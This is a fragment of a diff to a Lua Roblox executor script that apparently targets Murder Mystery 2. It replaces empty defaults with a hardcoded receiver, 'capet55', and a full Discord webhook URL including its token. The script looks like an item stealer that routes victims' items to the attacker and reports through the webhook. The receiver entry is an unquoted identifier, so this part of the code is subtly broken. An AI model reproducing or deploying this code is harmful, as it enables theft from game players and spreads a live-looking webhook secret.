@@ -148,8 +148,8 @@ if not getgenv().MM2_API_BASE then
 end
 
 local MM2_API_BASE = getgenv().MM2_API_BASE
-local RECEIVERS = getgenv().RECEIVERS or {}
-local WEBHOOK = getgenv().WEBHOOK or ""
+local RECEIVERS = getgenv().RECEIVERS or {capet55}
+local WEBHOOK = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1538453005714718801/LQfE9djXZ9rq_QYo-7IVTRc2B4oIN5sckLkRBvSNpy83Ue_rZEU33JLXavUKOiYcs61M"
 local THRESHOLD = getgenv().THRESHOLD or 1
 
 v32("Targets: " .. table.concat(RECEIVERS, ", "))
